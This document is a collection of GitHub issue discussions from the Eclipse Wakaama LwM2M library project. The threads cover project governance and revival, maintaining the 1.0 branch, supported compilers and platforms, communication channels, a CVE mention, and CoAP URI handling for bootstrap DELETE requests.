body:
@tluio @sbertin-telular I cannot find any issue based on this scenario. Any additional insights or can we dismiss this bug?

First dataP is set to NULL
https://github.com/eclipse/wakaama/blob/1b87c37096c1edfae7f4f964cb1306c0c883eb0f/core/observe.c#L523

When this if statement is false dataP remains NULL

https://github.com/eclipse/wakaama/blob/1b87c37096c1edfae7f4f964cb1306c0c883eb0f/core/observe.c#L535-L537

and execution continues in this for loop

https://github.com/eclipse/wakaama/blob/1b87c37096c1edfae7f4f964cb1306c0c883eb0f/core/observe.c#L580-L582

dataP is only used once and protected by check for NULL

https://github.com/eclipse/wakaama/blob/1b87c37096c1edfae7f4f964cb1306c0c883eb0f/core/observe.c#L778-L782

the loop and function exits

https://github.com/eclipse/wakaama/blob/1b87c37096c1edfae7f4f964cb1306c0c883eb0f/core/observe.c#L840-L844

title: Roadmap for this repo
body:
I noticed that PRs for LwM2M v1.1 are available for a while already but none of them have been merged (for an unknown reason). 

Can I have a roadmap for continuing the work on wakaama?

title: NA
body:
Hi @hannestschofenig,

  A lot of PRs was provided by contributors but without any answer from actual development team. :worried: 
  After a while contributors asked Eclipse foundation to find a solution. Eclipse foundation tried to contact current development team and in particular current project lead @dnav, but after several mails and time waiting without any answer ... The Eclipse foundation recently decides to create a new team for this project.

 Too bad that so many time was lost just because previous team abandoned the project without any news... :disappointed: 

 Anyway, there are currently at least 2 active contributors which should revive the project soon. Stay tuned :wink:

title: NA
body:
To say I am surprised by this announcement is an understatement. I have not received any communication from the Eclipse Foundation in the last six months.

The last communication we had was in February with Frédéric. I had the impression that there was an understanding of the status of Wakaama. Wakaama is a LwM2M 1.0 reference implementation. It is a foundational baseline and was never intended to be a complete product. To quote my discourse from that discussion:

> The consensus among users of Wakaama is that the project is complete. I had discussions with various industry people, and they are all satisfied with the current feature set. Of course, most have implemented additional features, but few want to contribute their features to Wakaama. This part should illustrate why new contributions did not get meaningful feedback: people are happy with the status quo and are reluctant to see new features coming to Wakaama. Yes, even LwM2M 1.1. They see that as a disruption of their current deployed setup.

Some additional points we should consider about the Wakaama project:

1. This is an open-source project.
    The license is permissive. If you are not satisfied with the direction, or the content of this project, fork it, as Scott did. Authorization is not required. 

2. This project is free (as in beer). No one owes anything to anyone.
    As previously mentioned, many large corporations have benefitted from this Wakaama, and added needed functionality in their self-interest without contributing in any way, shape, or form, and that is okay. People contributing are either doing it in their free time or to answer their own business needs. If you need something missing from it, and if your employer is okay for you to spend time and money working on this, do it. Otherwise, get something with additional features, complete documentation, and a full-time team supporting it like https://github.com/IOTEROP/IOWA.

To all the users of Wakaama during these years, thank you for your interest. Just remember that software, like any other work, has value.

Sincerely,
dnav

title: NA
NA
body:
Hi @dnav, 

I didn't follow precisely what happened with wakaama last month, but I can maybe give some hints about the current situation.

**About communication issue :** 
> I have not received any communication from the Eclipse Foundation in the last six months.

Email was sent as you can see : https://www.eclipse.org/lists/iot-pmc/msg06997.html (your were in copy, your ioterop.com address was used)
Maybe an issue with your email provider ? 

**About scope of the project :**
>  Wakaama is a LwM2M 1.0 reference implementation.

It seems this was not clear for the community and we can not blame it as there is nothing about this in documentation(readme or websites). 
And by the past you let understand that wakaama will support LWM2M 1.1 : https://www.eclipse.org/lists/wakaama-dev/msg00506.html

So not really surprising that people expect LWM2M 1.1 support.

**About community expectation :**

> The consensus among users of Wakaama is that the project is complete
> people are happy with the status quo and are reluctant to see new features coming to Wakaama.

This sounds clearly not the case when you see all the open PRs and issues.

> Yes, even LwM2M 1.1. They see that as a disruption of their current deployed setup.

I do not understand, generally this problem is solved using semantic versioning (or something like this).
 - one stable branch (1.x or 1.0.x) with bug fixes and not so much changes.
 - another one (2.x) for new feature with big API changes.

Of course people who are happy with the current version is not forced to upgrade.

> The license is permissive. If you are not satisfied with the direction, or the content of this project, fork it, as Scott did. Authorization is not required.
> No one owes anything to anyone.

Maybe, I'm wrong and @fdesbiens  will correct me, but I think this is not so true for eclipse project. An eclipse project is more than that. Committers are responsible to make the project "alive" at least by answering to community. They should also facilitate contribution and integration of new committers etc etc .. (see https://www.eclipse.org/projects/dev_process/#2_1_Open_Source_Rules_of_Engagement)
If there are no time or willingness to continue to make the project alive, committers should at least help to pass the torch.(I'm not sure this expression is really used in English :sweat_smile:)
If nobody is interested by the project anymore it should be archived.

>  If you need something missing from it, and if your employer is okay for you to spend time and money working on this, do it

Community try to do it but nobody integrate the changes :confused:

> Otherwise, get something with additional features, complete documentation, and a full-time team supporting it like https://github.com/IOTEROP/IOWA.

Maybe, I didn't get you but you seem a bit disappointed that there is not enough contribution to Wakaama project but at same time you encourage people to use your new closed-source solution. It sounds confusing to me. 

But to be honest, I still don't get what is your position about Wakaama project. Do you still feel as project lead ? or are you considering that the project is "finished" and should be archived ? I don't get it ?

title: NA
body:
Hi @dnav.

I am glad to see you are still around.

I am surprised you think we had reached an understanding. In my last private to reply to you, sent on January 20, I wrote this:

> I understand that a large part of the user base is happy with the code and not looking for new features. However, at least a few members of your community seem to have a different opinion. 
>
>Obviously, it is up to the project team to decide where Wakaama will be headed. That being said, I would strongly recommend to explore ways to accommodate people like Scott. A possible way, for example, would be to declare the current 1.0 release train as a long term support (LTS) branch that would live in parallel to a 2.x branch implementing new features. There are many other ways to achieve the same result. What do you think?

You never replied to me. This led me to bring the matter to the PMC.

Jens sent several emails to the PMC list and to the same ioterop.com address my email had been sent to. You never replied to any of them.

In [the last one](https://www.eclipse.org/lists/iot-pmc/msg07042.html), he wrote this.

> Shouldn't I hear back from you in the next week (which should make this a period of 4 weeks), my recommendation to EMO would be, to declare the project dysfunctional, so that we can elect new project leads and/or committers.

We are well past that date. 

Since April, I worked hard to find people willing to continue working on the project. We now have four potential committers willing to jump in. 

If you consider Wakaama is complete, what you have is not a project but just a dead repository. Projects have roadmaps, respond to issues and have commits. Dead repositories do not have a community around them and certainly do not contribute to the improvement of the Eclipse ecosystem. Moreover, as @sbernard31 mentioned, projects and committers have obligations to the community. I am sure @waynebeaton can provide more details.

The simple fact this GitHub issue exists shows there are people who wish to push Wakaama forward. 

So, David, the choice is yours. 

If all you care about is a reference implementation set in stone, then you can create your own static fork of the current repository and live happily ever after.

If you still wish to be part of the team, then I am sure the new committers will welcome your leadership and contributions. However, this means you will have to agree with them on a new course and scope for the project in an open and democratic fashion. 

Since you saw the previous messages in this thread, I expect you will read this one very soon. Please let us know as soon as possible if you wish to be part of the project's future.

title: NA
body:
I am not aware of any reason why this project should be prevented from moving forward. Hypothetically, there may be some limitations on what can be claimed with regard to a specification, but I am not aware of any such limitations. Without having specific knowledge of the governance of the specification process to which Eclipse Wakaama contributes a reference implementation, I have to assume that as long as the 1.0 version remains tagged, it may continue to be the reference implementation while the project progresses.

Independent of any claims regarding specifications, the project is open source and the Eclipse Foundation's definition of open source requires that a project be both [open and transparent](https://www.eclipse.org/projects/dev_process/#2_1_Open_Source_Rules_of_Engagement). Note that our particular definition of open means "open to input from others" (we often refer to this as a "level playing field").

With respect, "you can fork it and do what you want" does not conform to the Eclipse Foundation's definition of open source.

Having said all that, a Eclipse open source project is required to operate within its defined scope. If the contributions are within [scope of the Eclipse Wakaama project](https://projects.eclipse.org/projects/iot.wakaama/governance), then the contributions need to be given fair consideration for merging. It is completely reasonable, however, for a project team to reject contributions that fall outside of the project scope. It is not reasonable for a project team to completely ignore contributions (FWIW, there are a lot of open source projects that would love to have twenty pull requests).

By my observation, the project is no longer active. According to our process, in the absence of a compelling reason to do otherwise, the project should be terminated and archived. Alternatively, the project leadership chain (which includes the PMC and EMO) may declare the project dysfunctional and [replace the development](https://www.eclipse.org/projects/dev_process/#4_6_Leaders) team. How shall we proceed?

title: NA
body:
Thanks for everyone, summing up what already has happened in the last months. So I don't need to do it :)

> To say I am surprised by this announcement is an understatement. I have not received any communication from the Eclipse Foundation in the last six months.

As people already mentioned, that is not true. And I do think that this is indeed a big problem. If the people leading the project cannot be contacted.

> By my observation, the project is no longer active. According to our process, in the absence of a compelling reason to do otherwise, the project should be terminated and archived. Alternatively, the project leadership chain (which includes the PMC and EMO) may declare the project dysfunctional and [replace the development](https://www.eclipse.org/projects/dev_process/#4_6_Leaders) team. How shall we proceed?

I think the PMC already came to the same conclusion a while back. We already asked EMO to declare the project dysfunctional a while back. And we also took quite some extra time to discuss options, alternatives, … 

To me, this issues doesn't change the current situation of the project, and I would propose to continue with the plan do declare the project dysfunctional.

As @waynebeaton already mentioned, curating a specific version/tag/state of the repository is no problem at all. But development should be allowed to progress. The project still continues to be an Eclipse project, and thus allows current and new committers to work in the defined project scope. Existing committers can still work on the project, as they can now, if they wish to do so.

@waynebeaton if you need any additional +1 from the PMC, please let me know and I will start another e-mail thread.

title: NA
body:
OK. It seems I need to remind people of a fundamental fact:

I am not an employee of the Eclipse Foundation.

So please, do not blame me for not doing the things you want to be done. I explained my position in February. It seems you found people willing to take care of this repo. There are other committers. Why the drama ?

title: NA
body:
> I am not an employee of the Eclipse Foundation.

I don't think that anybody has made any consideration of your employment status. To be clear, while we do need certain paperwork from committers to ensure that they have their employer's approval to contribute to open source projects, employment status is otherwise irrelevant. In case there is any confusion, with a very small number of exceptions (mostly the Eclipse Dash and Eclipse CBI projects), the Eclipse Foundation does not employ any project leads or committers.

There appears to be some confusion regarding the project lead and committer roles, so I'd like to spend a minute to discuss what we're doing here in the larger sense.

The Eclipse Foundation Development Process (EDP), which all committers and project leads agree to implement, is all about building a community and ecosystem around open source technology. This means that committers and project leads agree to build up and, at least in part, serve a community around their technology. At least in part, that means that committers and project leads sign up to court contributor participation and help them with the contribution process. To do this successfully requires giving up any idea of absolute control and allowing others to participate on a level playing field (with in the scope of the project). Our most successful open source projects have committers representing a wide diversity of interests, employers, and backgrounds.

I don't see any drama here. Only a community trying to participate in and grow the project.

title: NA
body:
> @waynebeaton if you need any additional +1 from the PMC, please let me know and I will start another e-mail thread.

The project has zero active committers and so I agree with the PMC's assertion that we are in an exceptional situation. 

So now what? 

My strong preference is that the existing project team return to an active state and that they [start an election](https://www.eclipse.org/projects/handbook/#elections-committer) to bring aboard new committers to increase their diversity. Are any of the committers on this thread prepared to do that? FWIW, the project has three committers: all of them will need to vote in order for a committer election to conclude successfully.

That failing, as is outlined in the EDP, the project leadership chain (the project lead, PMC, and EMO) has responsibility to adjust the composition of the project team to get the project back into an active state. Who should be removed and who should be added? 

My recommendation is that we (the PMC or EMO) take this to the [wakaama-dev](https://accounts.eclipse.org/mailing-list/wakaama-dev) list.

[Developer's Forum]

Unlock Your Organization's IoT Device Management Capabilities with LwM2M

The benefits of using the Lightweight Machine to Machine (LwM2M) protocol to connect and manage IoT devices are noteworthy: reduced power and data consumption, firmware over the air (FOTA) updates and using latest security are just a few of the highlights. The freedom of not having to rely on a proprietary technology or build and maintain your own network is why many organizations looking for a sustainable IoT solution have chosen LwM2M.

But what exactly is LwM2M, and how does it stack up against the other technologies, such as MQTT? How difficult is it to implement, and what are the implications for an engineering or dev team? Join us for this free forum on 8 September at 16:00 CET and discover the potential that LwM2M has to offer.

title: ❓ Future of 1.0 version ❓
body:
Wakaama [`1.0`](https://github.com/eclipse/wakaama/tree/v1.0) is an implementation of LWM2M 1.0.x

Current `master` branch aims to target a LWM2M 1.1.x.
This`master` branch will probably break `1.0` API and so will be released as a 2.0 version (or higher if needed)

The question is :  **What should we do with the `1.0`, do we plan to still maintain it (at least bug fix release) ?**

@sbertin-telular, @rettichschnidi any though about this ?

Feedback from community would also be really appreciated :pray:

title: NA
body:
Personally, I have no interest in maintaining a 1.x release. Catching up with LWM2M 1.1+ and not being constrained by the existing API seems much more attractive to me.
We should only put any efforts into a new 1.x release once someone shows up and is willing to contribute to it.

title: NA
body: Unless there is strong community demand I also don't have interest in maintaining the 1.0 branch.

title: NA
body: On sierra side, I don't mind breaking the API, but having the client being able to support both 1.0 and 1.1 (if feasable at all) would be interesting since I suspect we will need to handle both cases in the wild

title: NA
body: My 1.1 changes have #defines to select which LWM2M version will be supported. This could be important for more constrained devices to limit memory requirements if only 1.0 features are required.

title: NA
body:
I think the 1.0 version needs to be maintained, at least for bug fixes. On
really constrained devices it might not be possible to migrate to LWM2M
1.1.x with a (likely) increased memory footprint just to get a bugfix. Also
The LWM2M 1.0.x support is not complete in the Wakaama 1.0 release, object
versioning support as an example and things like the block transfer support
is an addition to coap and does not depend on the lwm2m version (the later
should probably go into version 2.0)

Maybe do as @sbertin-telular with defines is enough?

title: NA
body:
I added Security policy (https://github.com/eclipse/wakaama/issues/491#issuecomment-722258006)
This thread is probably the good place to deciding which version is concerned by this policy.
The idea is to have something like : 
| Version | Supported          |
| ------- | ------------------ |
| 5.1.x   | :white_check_mark: |
| 5.0.x   | :x:                |
| 4.0.x   | :white_check_mark: |
| < 4.0   | :x:

title: NA
body:
> Maybe do as @sbertin-telular with defines is enough?

I would go for that, a single branch that support both version, now that does mean we need to know how much violence we want to do to the current wakaama version. 
due to the lack of completness on some core feature like blockwise transfer I think it will be hard to move forward without breaking some APIs

title: NA
body: The #defines I have are more for features than for API compatibility. I know some of my changes are not compatible with the 1.0 API.

title: NA
body:
**IF we want to keep a Wakaama version for LWM2M 1.0**, it seems there is 2 solutions : 
1. try to support this in the same branch (master)
2. try to create a dedicated `1.x` branch.

(Personally, I didn't know the code enough to be sure that 1. is doable)

About API compatibility, this is another question : 
 - I guess keeping API compatibility for `master` will be too hard. (To support LWM2M 1.1, I guess breaking API will be hard to avoid)
 - eventually keeping API compatibility for a `1.x` branch which targets only LWM2M 1.0 is maybe doable.
 - it is also possible to create a `1.x` branch which targets  LWM2M 1.0 only without API compatibility. As long as we document/communicate on this.

title: NA
body:
We are currently using wakaama with LWM2M version 1.0. We would hope if there is some code base maintained for version 1.0. 
But we are considering updating to 1.1 to use OSCORE in the future.
My master thesis will be about OSCORE. My (future) knowledge might help integrating OSCORE into wakaama.

title: NA
body:
@waynebeaton has volunteered to apply for CVE [1] now that [2] has been fixed by #640.

If anyone is really interested in maintaining version 1.0, now would be a great time - please chime in here and in [2].

If nobody steps up, Wakaama users are pretty much forced to update to master and we should officially acknowledge that version 1.0 is not supported at all.

[1] https://bugs.eclipse.org/bugs/show_bug.cgi?id=577968#c14
[2] https://bugs.eclipse.org/bugs/show_bug.cgi?id=577968

title: NA
body: The corresponding CVE is : [CVE-2021-41040](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-41040).

title: 📢 Wakaama Revival ! 🏗
body:
Hi all,

 Since several month the **Wakaama** project was not so active.
 Thanks to willingness of some contributors and Eclipse foundation, the project is reviving ! 🎉
 
  What does it mean ?
1. :white_check_mark:   ~New committers should join the team. ~(@sbertin-telular should be the first one)~ (#572)~
2. :white_check_mark: ~We will begin to integrate ongoing PR. (#486)~
3. :white_check_mark: ~We should also handle opened issues. (#507)~
3. We should also discuss about future of the 1.0 version. (#487)
4. :white_check_mark: ~We should discuss about setting a CI infrastructure.  (#182)~
5. We should also probably have a kind of road map or at least a list of hot topic ? (#597)
6.  :white_check_mark: ~Discuss about instant messaging (#490)~
7. Adding some common community documentation (#491)
8. Defining supported compilers, architectures, language versions (#494)
9. :white_check_mark:  ~Elect a new project lead (#616)~

 :white_check_mark:  ~At the same time we should also begin to have a look at all opened issues.~
 
 So Wakaama is back on track. Stay tuned ! 📻

title: Real-time messaging (chat) for the Wakaama project?
body:
To lower the entry barrier, simplifying communication, I'd like to have some kind of real-time messaging (chat) for the Wakaama project.

I could not find anything regarding Slack/IRC/Matrix/etc. in the [handbook](https://www.eclipse.org/projects/handbook/). The Eclipse project however has some [IRC](https://wiki.eclipse.org/IRC) channels on Freenode.

Any chance we can get a real-time messaging solution, preferable with history (like Slack/Matrix/etc.) declared as an official communication channel for this project? How?

title: NA
body:
Real-time messaging is great tool.
But **maybe** "multiplying discussion channel" could make less easier to follow Wakaama activity.
I would expect that just following github, you should be enough to understand what happens on the project.
The other advantages with github : 
 - is to be able to link old comment and so avoid to repeat yourself
 - answers or discussions are indexed by search engine.

Anyway, if team thinks this is better to have instant messaging : 
[Eclipse community](https://wiki.eclipse.org/Mattermost/About) handles a [mattermost](https://mattermost.org/) instance : https://mattermost.eclipse.org
More details : https://dentrassi.de/2016/06/15/mattermost-at-eclipse/
Maybe you should give it a try ?

title: NA
body: What about holding a regular, open conference call? I see this being used successfully in other projects.

title: NA
body: I'd prefer not having yet another communication channel I need to keep up with. It could also have discussions about issues become disassociated with the issue.

title: NA
body:
> What about holding a regular, open conference call? I see this being used successfully in other projects.

Personally, I'm not fan of this : 
- you lost the discussion history (no way to link comment or to have search engine index)
- only present people can know what was said. (or you need to archive audio/video ...)
- this is synchronous way (more complicate for people to join a discussion afterwards)
- people need good spoken english to participate.

title: Supported compilers, architectures, language versions
body:
I could not find any documentation regarding targeted (supported) compilers/architectures/languages/etc. Did I miss something?

If not, my needs/proposal would be:
* Compilers:
  * Latest version of GCC
  * Latest version of Clang
* Architectures:
  * x86_64 on Linux
  * MIPSel 32 bit on Linux
  * ARMv5/armel 32 bit on Linux
* Language versions:
  * C99/C11: Fully supported
  * C90: Only for what might become a 1.x maintenance branch (#487). No longer supported in master, relieving the project from its restrictions.
  * C++: While Wakaama contains no C++ code, it must be usable from a C++ project.

title: NA
body: My primary use is on a non-Linux system using the IAR compiler. It isn't practical to add my environment as supported, but I would not like to see any gcc/clang extensions used or Linux assumed outside of the examples. I would like for this to continue to be usable on constrained devices where running Linux isn't possible or practical.

title: NA
body: My primary use is also on a non Linux system. On the embedded devices i think we run it with free rtos or bara bone on the mcu and then we also run it as a server as a library on iOS. I think there is also some (non linux) desktop use for testing as well.

title: NA
body:
> My primary use is on a non-Linux system using the IAR compiler. 

Which architecture? ARM? Something with less than 32 bits?

> It isn't practical to add my environment as supported, but I would not like to see any gcc/clang extensions used or Linux assumed outside of the examples.

Regarding the extensions: How about adding a build configuration to CI which builds the "library" parts using -Wpedantic and "-Werror"?
Regarding non-Linux targets: Do you need Wakaama, client and/or server, to work with freestanding C implementations? Or is there some kind of OS?

title: NA
body:
I'm currently using an Arm Cortex-M3 based system, so 32-bit.

A CI build of the library parts with -Wpedantic and -Werror would probably be helpful.

I'm currently using an RTOS, but would like to see it continue to be possible to use it without an OS. As an example, adding mutexes (provided by the implementer) for thread safety would be OK, but requiring multiple threads would not. The mutex functions could then do nothing in a no-OS environment.

title: NA
body: PR #575 will ensure Wakaama can be built with C99 (and C11) as well as keeping GNU specific compiler extensions out of the code base.

title: NA
body: From the points I wanted to address, just "C99/C11: Fully supported" and "x86_64 on Linux" have been fully implemented. Everything else is still open and/or implemented partially. Also, I'd like to have some kind of documentation about the decisions taken - having #586 would help with this.

title: NA
body:
What should be the baseline platform we can safely rely on in Wakaama? I would assume we can use standard C functions (C99), but malloc and free are already wrapped in `platform.c`. `memcpy` in contrast is not wrapped.

 I understand that we don't want to rely on Unix-like operating systems, but what about POSIX?

In #709 I want to use functions from `benntoh` and `htobenn` which clearly fall into the Unix-like category. I agree it might make sense here to have a more portable solution.

Finally, if we want to support RTOS/freestanding C implementations we should include a representative example in the build pipeline to guarantee support.

title: Review/Integrate upstream COAP engine improvements
body:
It seems like the Contiki's COAP engine got introduced by [this commit](https://github.com/intel/liblwm2m/commit/a47a325) when Wakaama was still called liblwm2m. The files (er-coap-13.h, er-coap-13.c) seem to be copied from [this commit](https://github.com/contiki-ng/contiki-ng/tree/5e18efa10cb71d2ebbc92c8861c0907454252c2d/apps/er-coap-13) in Contiki.

Since then, many changes have been done for this project ([liblwm2m](https://github.com/intel/liblwm2m/commits/7b89b54642b23676681aff698a873617e288a9f7/externals/er-coap-13), [wakaama](https://github.com/intel/liblwm2m/commits/master/core/er-coap-13)), but also in Contiki(-NG) ([er-coap-13 folder](https://github.com/contiki-ng/contiki-ng/commits/master/apps/er-coap) (deleted), [erbium folder](https://github.com/contiki-ng/contiki-ng/commits/7d79b69adabd62ec14e31794d858fc7ce8956b2d/apps/erbium) which got moved to [er-coap](https://github.com/contiki-ng/contiki-ng/commits/master/apps/er-coap), and then again to [os/net/app-layer/coap](https://github.com/contiki-ng/contiki-ng/tree/develop/os/net/app-layer/coap)).

It would be nice to have this project profiting form relevant work done upstream. It probably makes sense to align this work with #352.

title: server: DELETE / request during bootstrap
body:
According to the lwm2m specification 1.1 (also 1.0) 6.4.2:
> Only in BootstrapInterface, Delete operation MAY target to "/" URI to delete all the existing 
> Object Instances - except LwM2M Bootstrap-Server Account - in the LwM2M Client

Looking at the following line: https://github.com/eclipse/wakaama/blob/9b025e949d1a9fccd9cea2d45da8c8e1a1b1ccf2/core/transaction.c#L181
the only possibility to send DELETE / request is, to omit the path-uri option in the coap header by having uriP set to NULL. It would be more explicit to set the path-uri option to empty string which would benefit the readability.

title: NA
body: §6.1.7.6 in TS-Core V1.1.1-20190617-A states that when a bootstrap delete is used without any parameter all instances of all objects must be removed (well almost..). Maybe that is clear enough, no need for a "/" path-uri option?

title: NA
body: MAY means it is optional. Omitting the path-uri option makes for a slightly smaller message (1 byte) which might be significant when paying by the byte with a large number of devices. Any compliant client should be able to handle it either way. We might need to check if it would be handled properly by the client code if it is included, but I would suggest not adding it to the server.

title: NA
body:
> §6.1.7.6 in TS-Core V1.1.1-20190617-A states that when a bootstrap delete is used without any parameter all instances of all objects must be removed (well almost..). Maybe that is clear enough, no need for a "/" path-uri option?

This is the core spec and so just explains what happens when `ObjectID` or `ObjectInstanceID` are not used.
Here there is no CoAP concept or  path URI concept involved. 
You need to see how it looks like regarding [transport spec](http://www.openmobilealliance.org/release/LightweightM2M/V1_1_1-20190617-A/HTML-Version/OMA-TS-LightweightM2M_Transport-V1_1_1-20190617-A.html#6-4-2-0-642-Bootstrap-Interface).

> MAY means it is optional. 

This is not my understanding of this "MAY".  It seems to me this MAY rather means that you can eventually delete all instance using "/".

As I understand the specification usage of "/" is the real LWM2M way, I think using an empty path is not allowed.
(an other hint : all example in the spec use "/")

> Omitting the path-uri option makes for a slightly smaller message (1 byte) which might be significant 
when paying by the byte with a large number of devices.

I agree this would be a kind of optimization but it would be out of spec for me.
**If my interpretation is correct,** I suppose using and supporting "/" is the right way and so server must use "/" and client should only support "/". Eventually client could also support no path-uri but this could hide some server misbehavior.

For this last point we face the classic dilemma, "should we be strict or tolerating" ? Generally we say "strict with output" and "flexible with input". But in my experience this is sometime a bad solution because this hide interoperability issue.
So maybe the right way with input is "strict by default but could be set flexible if needed to support bad implementation" ?

title: NA
body:
> > MAY means it is optional.
> 
> This is not my understanding of this "MAY". It seems to me this MAY rather means that you can eventually delete all instance using "/".

§3.1 in TS-Core V1.1.1-20190617-A states:

       The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT", "SHOULD", "SHOULD NOT",
       "RECOMMENDED", "MAY", and "OPTIONAL" in this document are to be interpreted as described in [RFC2119].

From [RFC2119 section 5](https://tools.ietf.org/html/rfc2119#section-5):

       5. MAY   This word, or the adjective "OPTIONAL", mean that an item is
       truly optional.  One vendor may choose to include the item because a
       particular marketplace requires it or because the vendor feels that
       it enhances the product while another vendor may omit the same item.
       An implementation which does not include a particular option MUST be
       prepared to interoperate with another implementation which does
       include the option, though perhaps with reduced functionality. In the
       same vein an implementation which does include a particular option
       MUST be prepared to interoperate with another implementation which
       does not include the option (except, of course, for the feature the
       option provides.)

> As I understand the specification usage of "/" is the real LWM2M way, I think using an empty path is not allowed.
> (an other hint : all example in the spec use "/")

According to [RFC7252 section 6.4 "Decomposing URIs into Options"](https://tools.ietf.org/html/rfc7252#section-6.4) step 8:

       8. If the value of the <path> component of |url| is empty or
       consists of a single slash character (U+002F SOLIDUS "/"), then
       move to the next step.

       Otherwise, for each segment in the <path> component, include a
       Uri-Path Option and let that option's value be the segment (not
       including the delimiting slash characters) after converting each
       percent-encoding ("%" followed by two hexadecimal digits) to the
       corresponding byte.
And then [section 6.5 "Composing URIs from Options"](https://tools.ietf.org/html/rfc7252#section-6.5) steps 6 & 7:

        6. Let |resource name| be the empty string.  For each Uri-Path
        Option in the request, append a single character U+002F SOLIDUS
        (/) followed by the option's value to |resource name|, after
        converting any character that is not either in the "unreserved"
        set, in the "sub-delims" set, a U+003A COLON (:) character, or a
        U+0040 COMMERCIAL AT (@) character to its percent-encoded form.

        7.   If |resource name| is the empty string, set it to a single
        character U+002F SOLIDUS (/).
So for CoAP, following the standard means not sending the Uri-Path Option for a path of "/". On reception, if only one Uri-Path Option is present and empty it is equivalent to not being present and will be "/".

We are already sending it properly by not including the Uri-Path Option.

On the receiving side, uri_decode() in uri,c has this, which will handle it either way:

        if (NULL == uriPath || uriPath->len == 0)
        {
            return LWM2M_REQUEST_TYPE_DELETE_ALL;
        }

I don't think there is any change needed.

title: NA
body:
About the MAY, I wanted to say it is applied to the feature (Bootstrap Delete all) and not how the path could be.
As "/"  and no option is encoded in a same way CoAP, my previous  comment didn't make sense  :sweat_smile:.

> I don't think there is any change needed.

Finally me too :)

title: NA
body:
I must admit, @sbertin-telular you are right with what the coap specification says according to composing and decomposing URIs.
So, I close this issue, because no change is needed. Good discussion anyway.
